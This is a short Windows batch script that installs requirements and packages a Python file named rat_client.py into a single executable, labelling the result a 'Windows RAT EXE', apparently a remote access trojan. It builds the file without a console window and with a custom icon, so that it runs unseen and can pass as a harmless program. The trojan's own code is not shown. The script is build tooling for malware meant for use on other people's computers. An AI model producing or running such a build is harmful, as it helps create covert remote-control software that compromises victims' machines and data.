@echo off
echo Building Windows RAT EXE...

REM Install dependencies
pip install -r requirements.txt

REM Build with PyInstaller
pyinstaller --onefile --noconsole --icon=icon.ico rat_client.py

echo.
echo ✅ Build complete!
echo ✅ EXE location: dist\rat_client.exe
pause